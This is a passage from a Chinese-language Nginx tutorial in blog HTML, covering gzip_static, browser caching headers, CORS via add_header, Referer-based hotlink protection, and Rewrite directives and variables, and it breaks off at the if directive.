class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mv objs<span class="hljs-regexp">/nginx /u</span>sr<span class="hljs-regexp">/local/</span>nginx/sbin<br></code></pre></td></tr></table></figure><p>(8)执行更新命令</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make upgrade</span><br></code></pre></td></tr></table></figure><h5 id="gzip_static测试使用"><a class="markdownIt-Anchor" href="#gzip_static测试使用"></a> gzip_static测试使用</h5><p>(1)直接访问<code>http://192.168.200.133/jquery.js</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587932106429.png" alt="1587932106429" /></p><p>(2)使用gzip命令进行压缩</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>html<br>gzip jquery.js<br></code></pre></td></tr></table></figure><p>(3)再次访问<code>http://192.168.200.133/jquery.js</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587932300006.png" alt="1587932300006" /></p><h3 id="静态资源的缓存处理"><a class="markdownIt-Anchor" href="#静态资源的缓存处理"></a> 静态资源的缓存处理</h3><h4 id="什么是缓存"><a class="markdownIt-Anchor" href="#什么是缓存"></a> 什么是缓存</h4><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">缓存（<span class="hljs-keyword">cache</span>），原始意义是指访问速度比一般随机存取存储器（RAM）快的一种高速存储器，通常它不像系统主存那样使用DRAM技术，而使用昂贵但较快速的SRAM技术。缓存的设置是所有现代计算机系统发挥高性能的重要因素之一。<br></code></pre></td></tr></table></figure><h4 id="什么是web缓存"><a class="markdownIt-Anchor" href="#什么是web缓存"></a> 什么是web缓存</h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Web缓存是指一个Web资源（如html页面，图片，js，数据等）存在于Web服务器和客户端（浏览器）之间的副本。缓存会根据进来的请求保存输出内容的副本；当下一个请求来到的时候，如果是相同的<span class="hljs-built_in">URL</span>，缓存会根据缓存机制决定是直接使用副本响应访问请求，还是向源服务器再次发送请求。比较常见的就是浏览器会缓存访问过网站的网页，当再次访问这个<span class="hljs-built_in">URL</span>地址的时候，如果网页没有更新，就不会再次下载网页，而是直接使用本地缓存的网页。只有当网站明确标识资源已经更新，浏览器才会再次下载网页<br></code></pre></td></tr></table></figure><h4 id="web缓存的种类"><a class="markdownIt-Anchor" href="#web缓存的种类"></a> web缓存的种类</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">客户端缓存<br>浏览器缓存<br>服务端缓存<br>Nginx <span class="hljs-regexp">/ Redis /</span> Memcached等<br></code></pre></td></tr></table></figure><h4 id="浏览器缓存"><a class="markdownIt-Anchor" href="#浏览器缓存"></a> 浏览器缓存</h4><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">是为了节约网络的资源加速浏览，浏览器在用户磁盘上对最近请求过的文档进行存储，当访问者再次请求这个页面时，浏览器就可以从本地磁盘显示文档，这样就可以加速页面的阅览.<br></code></pre></td></tr></table></figure><h4 id="为什么要用浏览器缓存"><a class="markdownIt-Anchor" href="#为什么要用浏览器缓存"></a> 为什么要用浏览器缓存</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">成本最低的一种缓存实现<br>减少网络带宽消耗<br>降低服务器压力<br>减少网络延迟，加快页面打开速度<br></code></pre></td></tr></table></figure><h4 id="浏览器缓存的执行流程"><a class="markdownIt-Anchor" href="#浏览器缓存的执行流程"></a> 浏览器缓存的执行流程</h4><p>HTTP协议中和页面缓存相关的字段，我们先来认识下：</p><table><thead><tr><th>header</th><th>说明</th></tr></thead><tbody><tr><td>Expires</td><td>缓存过期的日期和时间</td></tr><tr><td>Cache-Control</td><td>设置和缓存相关的配置信息</td></tr><tr><td>Last-Modified</td><td>请求资源最后修改时间</td></tr><tr><td>ETag</td><td>请求变量的实体标签的当前值，比如文件的MD5值</td></tr></tbody></table><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581762832290.png" alt="" /></p><p>（1）用户首次通过浏览器发送请求到服务端获取数据，客户端是没有对应的缓存，所以需要发送request请求来获取数据；</p><p>（2）服务端接收到请求后，获取服务端的数据及服务端缓存的允许后，返回200的成功状态码并且在响应头上附上对应资源以及缓存信息；</p><p>（3）当用户再次访问相同资源的时候，客户端会在浏览器的缓存目录中查找是否存在响应的缓存文件</p><p>（4）如果没有找到对应的缓存文件，则走(2)步</p><p>（5）如果有缓存文件，接下来对缓存文件是否过期进行判断，过期的判断标准是(Expires),</p><p>（6）如果没有过期，则直接从本地缓存中返回数据进行展示</p><p>（7）如果Expires过期，接下来需要判断缓存文件是否发生过变化</p><p>（8）判断的标准有两个，一个是ETag(Entity Tag),一个是Last-Modified</p><p>（9）判断结果是未发生变化，则服务端返回304，直接从缓存文件中获取数据</p><p>（10）如果判断是发生了变化，重新从服务端获取数据，并根据缓存协商(服务端所设置的是否需要进行缓存数据的设置)来进行数据缓存。</p><h4 id="浏览器缓存相关指令"><a class="markdownIt-Anchor" href="#浏览器缓存相关指令"></a> 浏览器缓存相关指令</h4><p>Nginx需要进行缓存相关设置，就需要用到如下的指令</p><h5 id="expires指令"><a class="markdownIt-Anchor" href="#expires指令"></a> expires指令</h5><p>expires:该指令用来控制页面缓存的作用。可以通过该指令控制HTTP应答中的“Expires&quot;和”Cache-Control&quot;</p><table><thead><tr><th>语法</th><th>expires   [modified] time<br/>expires epoch|max|off;</th></tr></thead><tbody><tr><td>默认值</td><td>expires off;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>time:可以整数也可以是负数，指定过期时间，如果是负数，Cache-Control则为no-cache,如果为整数或0，则Cache-Control的值为max-age=time;</p><p>epoch: 指定Expires的值为’1 January,1970,00:00:01 GMT’(1970-01-01 00:00:00)，Cache-Control的值no-cache</p><p>max:指定Expires的值为’31 December2037 23:59:59GMT’ (2037-12-31 23:59:59) ，Cache-Control的值为10年</p><p>off:默认不缓存。</p><h5 id="add_header指令"><a class="markdownIt-Anchor" href="#add_header指令"></a> add_header指令</h5><p>add_header指令是用来添加指定的响应头和响应值。</p><table><thead><tr><th>语法</th><th>add_header name value [always];</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>http、server、location…</td></tr></tbody></table><p>Cache-Control作为响应头信息，可以设置如下值：</p><p>缓存响应指令：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Cache-control:</span> <span class="hljs-string">must-revalidate</span><br><span class="hljs-attr">Cache-control:</span> <span class="hljs-literal">no</span><span class="hljs-string">-cache</span><br><span class="hljs-attr">Cache-control:</span> <span class="hljs-literal">no</span><span class="hljs-string">-store</span><br><span class="hljs-attr">Cache-control:</span> <span class="hljs-literal">no</span><span class="hljs-string">-transform</span><br><span class="hljs-attr">Cache-control:</span> <span class="hljs-string">public</span><br><span class="hljs-attr">Cache-control:</span> <span class="hljs-string">private</span><br><span class="hljs-attr">Cache-control:</span> <span class="hljs-string">proxy-revalidate</span><br><span class="hljs-attr">Cache-Control:</span> <span class="hljs-string">max-age=&lt;seconds&gt;</span><br><span class="hljs-attr">Cache-control:</span> <span class="hljs-string">s-maxage=&lt;seconds&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>must-revalidate</td><td>可缓存但必须再向源服务器进行确认</td></tr><tr><td>no-cache</td><td>缓存前必须确认其有效性</td></tr><tr><td>no-store</td><td>不缓存请求或响应的任何内容</td></tr><tr><td>no-transform</td><td>代理不可更改媒体类型</td></tr><tr><td>public</td><td>可向任意方提供响应的缓存</td></tr><tr><td>private</td><td>仅向特定用户返回响应</td></tr><tr><td>proxy-revalidate</td><td>要求中间缓存服务器对缓存的响应有效性再进行确认</td></tr><tr><td>max-age=&lt;秒&gt;</td><td>响应最大Age值</td></tr><tr><td>s-maxage=&lt;秒&gt;</td><td>公共缓存服务器响应的最大Age值</td></tr></tbody></table><p>max-age=[秒]：</p><h3 id="nginx的跨域问题解决"><a class="markdownIt-Anchor" href="#nginx的跨域问题解决"></a> Nginx的跨域问题解决</h3><p>这块内容，我们主要从以下方面进行解决：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">什么情况下会出现跨域问题?<br>实例演示跨域问题<br>具体的解决方案是什么?<br></code></pre></td></tr></table></figure><h4 id="同源策略"><a class="markdownIt-Anchor" href="#同源策略"></a> 同源策略</h4><p>浏览器的同源策略：是一种约定，是浏览器最核心也是最基本的安全功能，如果浏览器少了同源策略，则浏览器的正常功能可能都会受到影响。</p><p>同源:  协议、域名(IP)、端口相同即为同源</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.131</span><span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>https:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.131</span><span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>不<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.131</span><span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.132</span><span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>不<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.131</span><span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.131</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>不<br><br>http:<span class="hljs-regexp">//</span>www.nginx.com<span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span>www.nginx.org<span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>不<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.131</span><span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.131</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>不<br><br>http:<span class="hljs-regexp">//</span>www.nginx.org:<span class="hljs-number">80</span><span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span>www.nginx.org<span class="hljs-regexp">/user/</span><span class="hljs-number">1</span><br>满足<br></code></pre></td></tr></table></figure><h4 id="跨域问题"><a class="markdownIt-Anchor" href="#跨域问题"></a> 跨域问题</h4><p>简单描述下:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">有两台服务器分别为<span class="hljs-selector-tag">A</span>,<span class="hljs-selector-tag">B</span>,如果从服务器<span class="hljs-selector-tag">A</span>的页面发送异步请求到服务器<span class="hljs-selector-tag">B</span>获取数据，如果服务器<span class="hljs-selector-tag">A</span>和服务器<span class="hljs-selector-tag">B</span>不满足同源策略，则就会出现跨域问题。<br></code></pre></td></tr></table></figure><h4 id="跨域问题的案例演示"><a class="markdownIt-Anchor" href="#跨域问题的案例演示"></a> 跨域问题的案例演示</h4><p>出现跨域问题会有什么效果?,接下来通过一个需求来给大家演示下：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581766282200.png" alt="" />（1）nginx的html目录下新建一个a.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>跨域问题演示<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;jquery.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">            $(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                $(<span class="hljs-string">&quot;#btn&quot;</span>).<span class="hljs-title function_">click</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                        $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;http://192.168.200.133:8080/getUser&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;</span><br><span class="language-javascript">                                <span class="hljs-title function_">alert</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));</span><br><span class="language-javascript">                        &#125;);</span><br><span class="language-javascript">                &#125;);</span><br><span class="language-javascript">            &#125;);</span><br><span class="language-javascript">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;获取数据&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;btn&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>（2）在nginx.conf配置如下内容</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">server</span>&#123;<br>        <span class="hljs-keyword">listen</span>  <span class="hljs-number">8080</span>;<br>        server_name localhost;<br>        <span class="hljs-keyword">location</span> /getUser&#123;<br>                default_type application/<span class="hljs-type">json</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;TOM&quot;,&quot;age&quot;:18&#125;&#x27;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">80</span>;<br>server_name localhost;<br><span class="hljs-keyword">location</span> /&#123;<br>root html;<br><span class="hljs-keyword">index</span> <span class="hljs-keyword">index</span>.html;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(3)通过浏览器访问测试</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1588004913681.png" alt="1588004913681" /></p><h4 id="解决方案"><a class="markdownIt-Anchor" href="#解决方案"></a> 解决方案</h4><p>使用add_header指令，该指令可以用来添加一些头信息</p><table><thead><tr><th>语法</th><th>add_header name  value…</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>此处用来解决跨域问题，需要添加两个头信息，一个是<code>Access-Control-Allow-Origin</code>,<code>Access-Control-Allow-Methods</code></p><p>Access-Control-Allow-Origin: 直译过来是允许跨域访问的源地址信息，可以配置多个(多个用逗号分隔)，也可以使用<code>*</code>代表所有源</p><p>Access-Control-Allow-Methods:直译过来是允许跨域访问的请求方式，值可以为 GET POST PUT DELETE…,可以全部设置，也可以根据需要设置，多个用逗号分隔</p><p>具体配置方式</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">location</span> /getUser&#123;<br>    add_header <span class="hljs-keyword">Access</span>-Control-Allow-Origin *;<br>    add_header <span class="hljs-keyword">Access</span>-Control-Allow-Methods <span class="hljs-keyword">GET</span>,POST,PUT,<span class="hljs-keyword">DELETE</span>;<br>    default_type application/<span class="hljs-type">json</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;TOM&quot;,&quot;age&quot;:18&#125;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="静态资源防盗链"><a class="markdownIt-Anchor" href="#静态资源防盗链"></a> 静态资源防盗链</h3><h4 id="什么是资源盗链"><a class="markdownIt-Anchor" href="#什么是资源盗链"></a> 什么是资源盗链</h4><p>资源盗链指的是此内容不在自己服务器上，而是通过技术手段，绕过别人的限制将别人的内容放到自己页面上最终展示给用户。以此来盗取大网站的空间和流量。简而言之就是用别人的东西成就自己的网站。</p><p>效果演示</p><p>京东:<a href="https://img14.360buyimg.com/n7/jfs/t1/101062/37/2153/254169/5dcbd410E6d10ba22/4ddbd212be225fcd.jpg">https://img14.360buyimg.com/n7/jfs/t1/101062/37/2153/254169/5dcbd410E6d10ba22/4ddbd212be225fcd.jpg</a></p><p>百度:<a href="https://pics7.baidu.com/feed/cf1b9d16fdfaaf516f7e2011a7cda1e8f11f7a1a.jpeg?token=551979a23a0995e5e5279b8fa1a48b34&amp;s=BD385394D2E963072FD48543030030BB">https://pics7.baidu.com/feed/cf1b9d16fdfaaf516f7e2011a7cda1e8f11f7a1a.jpeg?token=551979a23a0995e5e5279b8fa1a48b34&amp;s=BD385394D2E963072FD48543030030BB</a></p><p>我们自己准备一个页面，在页面上引入这两个图片查看效果</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581827029973.png" alt="" /></p><p>从上面的效果，可以看出来，下面的图片地址添加了防止盗链的功能，京东这边我们可以直接使用其图片。</p><h4 id="nginx防盗链的实现原理"><a class="markdownIt-Anchor" href="#nginx防盗链的实现原理"></a> Nginx防盗链的实现原理：</h4><p>了解防盗链的原理之前，我们得先学习一个HTTP的头信息Referer,当浏览器向web服务器发送请求的时候，一般都会带上Referer,来告诉浏览器该网页是从哪个页面链接过来的。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581769820325.png" alt="" /></p><p>后台服务器可以根据获取到的这个Referer信息来判断是否为自己信任的网站地址，如果是则放行继续访问，如果不是则可以返回403(服务端拒绝访问)的状态信息。</p><p>在本地模拟上述的服务器效果：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581769079083.png" alt="" /></p><p>Nginx防盗链的具体实现:</p><p>valid_referers:nginx会通就过查看referer自动和valid_referers后面的内容进行匹配，如果匹配到了就将$invalid_referer变量置0，如果没有匹配到，则将$invalid_referer变量置为1，匹配的过程中不区分大小写。</p><table><thead><tr><th>语法</th><th>valid_referers none|blocked|server_names|string…</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>server、location</td></tr></tbody></table><p>none: 如果Header中的Referer为空，允许访问</p><p>blocked:在Header中的Referer不为空，但是该值被防火墙或代理进行伪装过，如不带&quot;http://&quot; 、&quot;https://&quot;等协议头的资源允许访问。</p><p>server_names:指定具体的域名或者IP</p><p>string: 可以支持正则表达式和*的字符串。如果是正则表达式，需要以<code>~</code>开头表示，例如</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> ~*\.(png|jpg|gif)&#123;<br>           <span class="hljs-attribute">valid_referers</span> <span class="hljs-literal">none</span> <span class="hljs-literal">blocked</span> www.baidu.com <span class="hljs-number">192.168.200.222</span> <span class="hljs-regexp">*.example.com</span> <span class="hljs-regexp">example.*</span>  www.example.org  ~\.google\.;<br>           <span class="hljs-attribute">if</span> (<span class="hljs-variable">$invalid_referer</span>)&#123;<br>                <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>;<br>           &#125;<br>           <span class="hljs-attribute">root</span> /usr/local/nginx/html;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>遇到的问题:图片有很多，该如何批量进行防盗链？</p><h4 id="针对目录进行防盗链"><a class="markdownIt-Anchor" href="#针对目录进行防盗链"></a> 针对目录进行防盗链</h4><p>配置如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /images &#123;<br>           <span class="hljs-attribute">valid_referers</span> <span class="hljs-literal">none</span> <span class="hljs-literal">blocked</span> www.baidu.com <span class="hljs-number">192.168.200.222</span> <span class="hljs-regexp">*.example.com</span> <span class="hljs-regexp">example.*</span>  www.example.org  ~\.google\.;<br>           <span class="hljs-attribute">if</span> (<span class="hljs-variable">$invalid_referer</span>)&#123;<br>                <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>;<br>           &#125;<br>           <span class="hljs-attribute">root</span> /usr/local/nginx/html;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这样我们可以对一个目录下的所有资源进行翻到了操作。</p><p>遇到的问题：Referer的限制比较粗，比如随意加一个Referer，上面的方式是无法进行限制的。那么这个问题改如何解决？</p><p>此处我们需要用到Nginx的第三方模块<code>ngx_http_accesskey_module</code>，第三方模块如何实现盗链，如果在Nginx中使用第三方模块的功能，这些我们在后面的Nginx的模块篇再进行详细的讲解。</p><h2 id="rewrite功能配置"><a class="markdownIt-Anchor" href="#rewrite功能配置"></a> Rewrite功能配置</h2><p>Rewrite是Nginx服务器提供的一个重要基本功能，是Web服务器产品中几乎必备的功能。主要的作用是用来实现URL的重写。<a href="http://www.jd.com">www.jd.com</a><br />注意:Nginx服务器的Rewrite功能的实现依赖于PCRE的支持，因此在编译安装Nginx服务器之前，需要安装PCRE库。Nginx使用的是ngx_http_rewrite_module模块来解析和处理Rewrite功能的相关配置。</p><p>Rewrite的相关命令</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">set</span>指令<br><span class="hljs-keyword">if</span>指令<br><span class="hljs-keyword">break</span>指令<br><span class="hljs-keyword">return</span>指令<br>rewrite指令<br>rewrite_log指令<br></code></pre></td></tr></table></figure><p>Rewrite的应用场景</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c">域名跳转<br>域名镜像<br>独立域名<br>目录自动添加<span class="hljs-string">&quot;/&quot;</span><br>合并目录<br>防盗链的实现<br></code></pre></td></tr></table></figure><h3 id="rewrite的相关指令"><a class="markdownIt-Anchor" href="#rewrite的相关指令"></a> Rewrite的相关指令</h3><h4 id="set指令"><a class="markdownIt-Anchor" href="#set指令"></a> set指令</h4><p>该指令用来设置一个新的变量。</p><table><thead><tr><th>语法</th><th>set $variable value;</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>server、location、if</td></tr></tbody></table><p>variable:变量的名称，该变量名称要用&quot;$&quot;作为变量的第一个字符，且不要与Nginx服务器预设的全局变量同名。</p><p>value:变量的值，可以是字符串、其他变量或者变量的组合等。</p><h4 id="rewrite常用全局变量"><a class="markdownIt-Anchor" href="#rewrite常用全局变量"></a> Rewrite常用全局变量</h4><table><thead><tr><th>变量</th><th>说明</th></tr></thead><tbody><tr><td>$args</td><td>变量中存放了请求URL中的请求参数。比如http://192.168.200.133/server?arg1=value1&amp;args2=value2中的&quot;arg1=value1&amp;arg2=value2&quot;，功能和$query_string一样</td></tr><tr><td>$http_user_agent</td><td>变量存储的是用户访问服务的代理信息(如果通过浏览器访问，记录的是浏览器的相关版本信息)</td></tr><tr><td>$host</td><td>变量存储的是访问服务器的server_name值</td></tr><tr><td>$document_uri</td><td>变量存储的是当前访问地址的URI。比如http://192.168.200.133/server?id=10&amp;name=zhangsan中的&quot;/server&quot;，功能和$uri一样</td></tr><tr><td>$document_root</td><td>变量存储的是当前请求对应location的root值，如果未设置，默认指向Nginx自带html目录所在位置</td></tr><tr><td>$content_length</td><td>变量存储的是请求头中的Content-Length的值</td></tr><tr><td>$content_type</td><td>变量存储的是请求头中的Content-Type的值</td></tr><tr><td>$http_cookie</td><td>变量存储的是客户端的cookie信息，可以通过add_header Set-Cookie 'cookieName=cookieValue’来添加cookie数据</td></tr><tr><td>$limit_rate</td><td>变量中存储的是Nginx服务器对网络连接速率的限制，也就是Nginx配置中对limit_rate指令设置的值，默认是0，不限制。</td></tr><tr><td>$remote_addr</td><td>变量中存储的是客户端的IP地址</td></tr><tr><td>$remote_port</td><td>变量中存储了客户端与服务端建立连接的端口号</td></tr><tr><td>$remote_user</td><td>变量中存储了客户端的用户名，需要有认证模块才能获取</td></tr><tr><td>$scheme</td><td>变量中存储了访问协议</td></tr><tr><td>$server_addr</td><td>变量中存储了服务端的地址</td></tr><tr><td>$server_name</td><td>变量中存储了客户端请求到达的服务器的名称</td></tr><tr><td>$server_port</td><td>变量中存储了客户端请求到达服务器的端口号</td></tr><tr><td>$server_protocol</td><td>变量中存储了客户端请求协议的版本，比如&quot;HTTP/1.1&quot;</td></tr><tr><td>$request_body_file</td><td>变量中存储了发给后端服务器的本地文件资源的名称</td></tr><tr><td>$request_method</td><td>变量中存储了客户端的请求方式，比如&quot;GET&quot;,&quot;POST&quot;等</td></tr><tr><td>$request_filename</td><td>变量中存储了当前请求的资源文件的路径名</td></tr><tr><td>$request_uri</td><td>变量中存储了当前请求的URI，并且携带请求参数，比如http://192.168.200.133/server?id=10&amp;name=zhangsan中的&quot;/server?id=10&amp;name=zhangsan&quot;</td></tr></tbody></table><p>上述参数还可以在日志文件中使用，这个就要用到前面我们介绍的<code>log_format</code>指令</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">log_format</span> main <span class="hljs-string">&#x27;<span class="hljs-variable">$remote_addr</span> - <span class="hljs-variable">$request</span> - <span class="hljs-variable">$status</span>-<span class="hljs-variable">$request_uri</span>  <span class="hljs-variable">$http_user_agent</span>&#x27;</span>;<br><br><span class="hljs-attribute">access_log</span> logs/access.log main;<br></code></pre></td></tr></table></figure><h4 id="if指令"><a class="markdownIt-Anchor" href="#if指令"></a> if指令</h4><p>该指令用来支持条件判断，并根据条件判断结果选择不同的Nginx配置。</p><table><thead><tr><th>语法</th><th>if  